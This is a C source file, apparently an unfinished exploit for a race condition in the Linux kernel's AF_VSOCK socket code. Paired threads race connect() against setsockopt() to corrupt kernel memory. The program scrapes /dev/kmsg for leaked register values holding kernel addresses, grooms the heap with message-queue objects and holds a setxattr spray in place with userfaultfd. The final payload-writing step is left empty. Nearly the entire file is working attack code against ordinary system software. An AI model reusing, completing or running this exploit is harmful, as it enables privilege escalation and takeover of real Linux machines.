#define _GNU_SOURCE


#include <stdlib.h>
#include <time.h>
#include <errno.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <pthread.h>
#include <sys/mman.h>
#include <semaphore.h>
#include <sys/ioctl.h>
#include <sys/xattr.h>
#include <stdatomic.h>
#include <sys/socket.h>
#include <linux/vm_sockets.h>
#include <linux/userfaultfd.h>


#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define MAX_RACE_LAG_USEC 50
#define PAGE_SIZE		4096
#define PAYLOAD_SZ 		40
#define ARB_READ_SZ 	6096
#define MAGICPAGE1		((void*)0x444342414000)
#define MAGICPAGE2		((void*)0x444342415000)
#define SPRAY_DATA_PAGE ((void*)0x444342416000) // why this addres? npi
#define MSGSZ 128

int vsock = -1;
int tfail = 0;
pthread_barrier_t barrier;
pthread_barrier_t xattr_barrier;
void *xattr_addr;
void *spray_data;

typedef struct {
	int faultfd;
	struct uffd_msg *fmsg;
	void* spray_data;
} xattrarg;

void *th_userfault_xattr(void *arg)
{
	xattrarg* xarg = (xattrarg*)arg;
		// wait on userfault
	int faultfd = xarg->faultfd;
	int nread;
	struct uffd_msg *fmsg = xarg->fmsg;

	nread = read(faultfd, fmsg, sizeof(*fmsg));
	printf("[+] xattr got the fault\n");
	if (nread < 0) {
		err_exit("[-] xattr userfault read\n");
	} else if (nread == 0) {
		err_exit("[-] xattr EOF for userfault fd?\n");
	}

	if (fmsg->event != UFFD_EVENT_PAGEFAULT) {
		err_exit("[-] xattr got weird event\n");
	}

	if ((fmsg->arg.pagefault.address < (uint64_t)spray_data+PAGE_SIZE*4) || (fmsg->arg.pagefault.address >= (uint64_t)(spray_data+PAGE_SIZE*5))) {
		err_exit("[-] xattr Got strange address for fault\n");
	}

	
	while(1){
		continue;
	}
	return NULL;
	// Don't handle pagefault! this way xattr created spray is kept.
}

void prepare_payload() // void prepare_payload(void *spray_data, unsigned long kaddr)
{
	//struct msg_msg *msg_ptr;
	void* ret;
	xattr_addr = spray_data + PAGE_SIZE * 4 - PAYLOAD_SZ;

	//Don't touch the second part to avoid breaking page fault delivery 
	// spray_data -> pointer
    ret = memset(spray_data, 0xa5, PAGE_SIZE * 4);
    if(ret < 0){
    	err_exit("[-] memset");
    }
    // WRITE PAYLOAD HERE

}

void *th_xattr_heap_spraying(void *arg)
{

	void *addr = (uint64_t)xattr_addr;
    size_t size = 40 +1; // 40 for payload + extra to provoke userfault

    int ret = pthread_barrier_wait(&xattr_barrier);
    if (ret != 0 && ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		err_exit("[-] xattr pthread_barrier_wait");
	}
	//setxattr
	ret = setxattr("./", "user.exp", addr, size, 0);
	if(ret < 0){
		err_exit("[-] xattr syscall\n");
	}
	return NULL;
}

void *receive_all_previous_msg(key_t key)
{
	struct msgbuf msgb;
	int msqid;
	msqid = msgget(key, 0666);
	if(msqid < 0){
		printf("[ ] No previous messages exist\n");
		return NULL;
	}

	int msgcnt = 0;
	int ret = 1;
	while(ret>-1){
		ret = msgrcv(msqid, &msgb, MSGSZ, 1, IPC_NOWAIT);
		if(ret >0){
			msgcnt++;
		}
	}
	printf("[ ] emptied msg queue: %d received\n", msgcnt);

}

void *receive_msg(key_t key)
{
	struct msgbuf msgb;
	int msqid;
	msqid = msgget(key, 0666);
	if(msqid < 0){
		printf("[ ] No previous messages exist\n");
		return NULL;
	}

	int msgcnt = 0;
	int ret;
	ret = msgrcv(msqid, &msgb, MSGSZ, 1, IPC_NOWAIT);
	if(ret < 0){
		err_exit("[-] receive_msg\n");
	}
	

}

void *remove_message_queues(key_t key)
{
	int ret;
	int msqid;
	msqid = msgget(key, 0666);
	if(msqid < 0){
		printf("[!!] No previous messages exist\n");
		return NULL;
	}
	ret = msgctl(msqid, IPC_RMID, 0);
	if(ret != 0){
		err_exit("[-] msgctl");
	}
	printf("[+] message queue removed\n");
	return NULL;
}

void send_msg(char *msg_val, key_t key){
	int result;
	size_t buf_length;
	struct msgbuf msgb;

    int msgflg = IPC_CREAT | 0666;

    int msqid = msgget(key, msgflg);
    if(msqid<0){
    	err_exit("[-] msgget\n");
    }

	msgb.mtype = 1;
	strcpy(msgb.mtext, msg_val);
	buf_length = strlen(msgb.mtext) + 1;
	result = msgsnd(msqid, &msgb, buf_length, IPC_NOWAIT);
	if(result != 0) {
		err_exit("[-] msgsnd failed!\n");
	}

}

typedef struct {
	FILE *fp;
	char *rbx;
	char *rcx;
} parsearg;

void *th_parse_kmsg(void* arg)
{

	parsearg* parg = (parsearg*)arg;
	FILE *fp = parg->fp;
	char *rbx = parg->rbx;
	char *rcx = parg->rcx;
	size_t len = 0;
	ssize_t readl;
	char *pch = NULL;
	int found = 0;
	char *rbx_string = "RBX";
	char *line = NULL;
	while(((readl = getline(&line, &len, fp)) != 0) && found == 0){
		pch = strstr(line, rbx_string);
		if(pch){
			strncpy(rbx, pch+5, 16);
			strncpy(rcx, pch+27, 16);
			rbx[16] = '\0';
			rcx[16] = '\0';

			char rbx_null[17];
			strcpy(rbx_null, "0000000000000000");
			if(strncmp(rbx, rbx_null, 16) != 0){
				found++;
			}
		}
	}

	return NULL;

}


int thread_sync(long lag_nsec)
{
	int ret = -1;
	struct timespec ts0;
	struct timespec ts;
	long delta_nsec = 0;

	ret = pthread_barrier_wait(&barrier);
	if (ret != 0 && ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		perror("[-] pthread_barrier_wait");
		return EXIT_FAILURE;
	}

	ret = clock_gettime(CLOCK_MONOTONIC, &ts0);
	if (ret != 0) {
		perror("[-] clock_gettime");
		return EXIT_FAILURE;
	}

	while (delta_nsec < lag_nsec) {
		ret = clock_gettime(CLOCK_MONOTONIC, &ts);
		if (ret != 0) {
			perror("[-] clock_gettime");
			return EXIT_FAILURE;
		}

		delta_nsec = (ts.tv_sec - ts0.tv_sec) * 1000000000 +
						ts.tv_nsec - ts0.tv_nsec;
	}

	return EXIT_SUCCESS;
}

typedef struct {
	long lag_nsec;
} connecterarg;

void *th_connect(void *arg)
{
	connecterarg* carg = (connecterarg*)arg;
	int ret = -1;
	long lag_nsec = carg->lag_nsec * 1000;
	struct timespec tp0;
	struct timespec tp;

	struct sockaddr_vm addr = {
		.svm_family = AF_VSOCK,
	};

	key_t key = 1;

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	addr.svm_cid = VMADDR_CID_LOCAL;
	connect(vsock, (struct sockaddr *)&addr, sizeof(struct sockaddr_vm));

	addr.svm_cid = VMADDR_CID_HYPERVISOR;
	connect(vsock, (struct sockaddr *)&addr, sizeof(struct sockaddr_vm));

	clock_gettime(CLOCK_MONOTONIC, &tp0);
	clock_gettime(CLOCK_MONOTONIC, &tp);

	while(tp0.tv_nsec + 35*1000 > tp.tv_nsec){
		clock_gettime(CLOCK_MONOTONIC, &tp);
	}

	
	send_msg("GGGGGGGGGGGGGGG", key);
	return NULL;
}

void *th_connect_overwrite(void *arg)
{
	connecterarg* carg = (connecterarg*)arg;
	int ret = -1;
	long lag_nsec = carg->lag_nsec * 1000;
	struct sockaddr_vm addr = {
		.svm_family = AF_VSOCK,
	};

	key_t key = 2;

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	addr.svm_cid = VMADDR_CID_LOCAL;
	connect(vsock, (struct sockaddr *)&addr, sizeof(struct sockaddr_vm));

	addr.svm_cid = VMADDR_CID_HYPERVISOR;
	connect(vsock, (struct sockaddr *)&addr, sizeof(struct sockaddr_vm));

	
	send_msg("CCCCCCCCCCCCCCC", key);
	return NULL;
}

typedef struct {
	long lag_nsec;
	unsigned long write_val;
} writerarg;

void *th_setsockopt(void *arg)
{
	writerarg* warg = (writerarg*)arg;
	int ret = -1;
	long lag_nsec = warg->lag_nsec * 1000;
	struct timespec tp;
	unsigned long size = 0;

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	clock_gettime(CLOCK_MONOTONIC, &tp);
	size = tp.tv_nsec;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
						&size, sizeof(unsigned long));

	return NULL;
}

void *th_setsockopt_overwrite(void *arg)
{
	writerarg* warg = (writerarg*)arg;
	int ret = -1;
	long lag_nsec = warg->lag_nsec * 1000;
	struct timespec tp;
	unsigned long size = 0;
	unsigned long val = warg->write_val;

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	clock_gettime(CLOCK_MONOTONIC, &tp);
	size = tp.tv_nsec;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
						&val, sizeof(unsigned long));

	return NULL;
}


int main(void)
{
	//receive_all_previous_msg(1);
	//receive_all_previous_msg(2);
	//remove_message_queues(1);
	//remove_message_queues(2);
	int ret = -1;
	unsigned long size = 0;
	long loop = 0;
	pthread_t th[6] = { 0 };
	pthread_t x_th[127] = { 0 };
	pthread_t xtid;
	FILE *fp; 
	int i;

	char rbx_good[2][17];
	char rcx_good[2][17];

	char rbx_corr[17];
	char rcx_corr[17];

	unsigned long good_msg_addr[2];

	parsearg parg;
	writerarg warg;
	connecterarg carg;
	xattrarg xarg;

	int xattr_faultfd = -1;
	struct uffdio_api xattr_ufapi;
	struct uffdio_register xattr_ufreg;
	struct uffd_msg xattr_fmsg;
	struct uffdio_zeropage xattr_go;


	///////////////////////////////////////////////////////////USERFAULTFD XATTR //////////////////////////////////////



	xattr_faultfd = syscall(323, 0);
	if (xattr_faultfd < 0)
		err_exit("[-] faultfd\n");

	xattr_ufapi.api = UFFD_API;
	xattr_ufapi.features = 0;

	if (ioctl(xattr_faultfd, UFFDIO_API, &xattr_ufapi) == -1) {
		err_exit("[-] xattr ioctl UFFDIO_API\n");
	}

	spray_data = mmap(SPRAY_DATA_PAGE, PAGE_SIZE*5, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (spray_data == MAP_FAILED) {
		err_exit("[-] xattr mmap\n");
	}

	prepare_payload(spray_data);

	xattr_ufreg.range.start = (uint64_t)(spray_data + PAGE_SIZE*4);
	xattr_ufreg.range.len = PAGE_SIZE;
	xattr_ufreg.mode = UFFDIO_REGISTER_MODE_MISSING;

	if (ioctl(xattr_faultfd, UFFDIO_REGISTER, &xattr_ufreg)) {
		err_exit("[-] xattr ioctl UFFDIO_REGISTER\n");
	}

	xarg.faultfd = xattr_faultfd;
	xarg.fmsg = &xattr_fmsg;
	if (pthread_create(&xtid, NULL, th_userfault_xattr, (void*)&xarg)) {
		err_exit("[-] userfault_xattr pthread_create\n");
	}

	printf("[+] thread for xattr userfault handling created\n");


	////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	ret = pthread_barrier_init(&xattr_barrier, NULL, 128);
	if (ret != 0)
		err_exit("[-] pthread_barrier_init");
	printf("spray_data: %p\n", spray_data);
	for(i=0; i<127; i++){
		ret = pthread_create(&x_th[i], NULL, th_xattr_heap_spraying, &xarg);
		if (ret != 0)
			err_exit("[-] pthread_create #0");
	}

	fp = fopen("/dev/kmsg", "r");
	if (fp == NULL)
		err_exit("[-] open /dev/kmsg");

	vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (vsock == -1)
		err_exit("[-] open vsock");

	printf("[+] AF_VSOCK socket is opened\n");

	size = 1;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE,
						&size, sizeof(unsigned long));
	size = 0xfffffffffffffffdlu;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MAX_SIZE,
						&size, sizeof(unsigned long));

	ret = pthread_barrier_init(&barrier, NULL, 2);
	if (ret != 0)
		err_exit("[-] pthread_barrier_init");




	int aurkitu = 0;


	for(i=0; i<2; i++){
		aurkitu = 0;
		parg.fp = fp;
		parg.rbx = rbx_good[i];
		parg.rcx = rcx_good[i];
		while(aurkitu == 0) {
		fseek(fp, 0, SEEK_END);
		long tmo1 = 0;
		long tmo2 = loop % MAX_RACE_LAG_USEC;

		carg.lag_nsec = tmo1;	
		warg.lag_nsec = tmo2;


		//printf("race loop %ld: tmo1 %ld, tmo2 %ld\n", loop, tmo1, tmo2);

		ret = pthread_create(&th[0], NULL, th_connect, &carg);
		if (ret != 0)
			err_exit("[-] pthread_create #0");

		ret = pthread_create(&th[1], NULL, th_setsockopt, &warg);
		if (ret != 0)
			err_exit("[-] pthread_create #1");

		ret = pthread_join(th[0], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #0");

		ret = pthread_join(th[1], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #1");

		if (tfail) {
			printf("[-] some thread got troubles\n");
			exit(EXIT_FAILURE);
		}


		ret = pthread_create(&th[2], NULL, th_parse_kmsg, &parg);
		if (ret != 0)
			err_exit("[-] pthread_create #1");


		// Time to parse /dev/kmsg
		usleep( 5 * 1000);
		pthread_cancel(th[2]);

		ret = pthread_join(th[2], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #2");

		if(strncmp(rcx_good[i], "ff", 2) == 0){
			printf("[+] RCX, good msg_msg: 0x%s\n", rcx_good[i]);
			aurkitu++;
		}else{
			receive_msg(1);
		}
		loop++;

	}
	}

	fclose(fp);

	fp = fopen("/dev/kmsg", "r");
	if (fp == NULL)
		err_exit("[-] open /dev/kmsg");

	char rcx_good_lsb [9];
	memcpy(rcx_good_lsb, &rcx_good[0][8], 8);
	char *ptr;

	good_msg_addr[0] = strtol(rcx_good_lsb, &ptr, 16);

	memcpy(rcx_good_lsb, &rcx_good[1][8], 8);
	good_msg_addr[1] = strtol(rcx_good_lsb, &ptr, 16);



	printf("[ ] looping for overwriting ...\n");
	aurkitu = 0;
	loop = 0;


	parg.fp = fp;
	parg.rbx = rbx_corr;
	parg.rcx = rcx_corr;

	while(aurkitu == 0) {
		if(loop % 2 == 0){
			warg.write_val = good_msg_addr[0];
		}else{
			warg.write_val = good_msg_addr[1];
		}
		fseek(fp, 0, SEEK_END);
		long tmo1 = 0;
		long tmo2 = loop % MAX_RACE_LAG_USEC;

		carg.lag_nsec = tmo1;	
		warg.lag_nsec = tmo2;


		//printf("race loop %ld: tmo1 %ld, tmo2 %ld\n", loop, tmo1, tmo2);

		ret = pthread_create(&th[0], NULL, th_connect_overwrite, &carg);
		if (ret != 0)
			err_exit("[-] pthread_create #0");

		ret = pthread_create(&th[1], NULL, th_setsockopt_overwrite, &warg);
		if (ret != 0)
			err_exit("[-] pthread_create #1");

		ret = pthread_join(th[0], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #0");

		ret = pthread_join(th[1], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #1");

		if (tfail) {
			printf("[-] some thread got troubles\n");
			exit(EXIT_FAILURE);
		}


		ret = pthread_create(&th[2], NULL, th_parse_kmsg, &parg);
		if (ret != 0)
			err_exit("[-] pthread_create #1");


		// Time to parse /dev/kmsg
		usleep( 5 * 1000);
		pthread_cancel(th[2]);

		ret = pthread_join(th[2], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #2");

		if(strncmp(rcx_corr, "ff", 2) == 0){
			printf("[+] RCX, corr msg_msg: 0x%s\n", rcx_corr);
			aurkitu++;
		}else{
			receive_msg(2);
		}
		loop++;

	}

	key_t key = 2;
	int msqid = msgget(key, 0666);
	if(msqid < 0){
		err_exit("[-] msgget 2");
	}

	printf("[ ] press 'g' to continue\n");

	while (getchar() != 'g') {};

	struct msgbuf msgb;
	printf("[ ] waiting for message ...\n");
	ret = 1;
	ret = msgrcv(msqid, &msgb, MSGSZ, 1, 0);
	printf("received msg: %s, size %d\n", msgb.mtext, ret);


	// Start xattr+usefaultfd sprayinh
	ret = pthread_barrier_wait(&xattr_barrier);
    if (ret != 0 && ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		perror("[-] xattr pthread_barrier_wait");
		return EXIT_FAILURE;
	}

	printf("[ ] spraying...\n");

	for(i=0; i<127; i++){
		ret = pthread_join(x_th[i], NULL);
		if (ret != 0)
			err_exit("[-] xattr pthread_join #\n");
	}

	printf("END\n");
	while(1){
		continue;
	}
	ret = close(vsock);
	if (ret)
		err_exit("[-] vsock close");

	return 0;
}
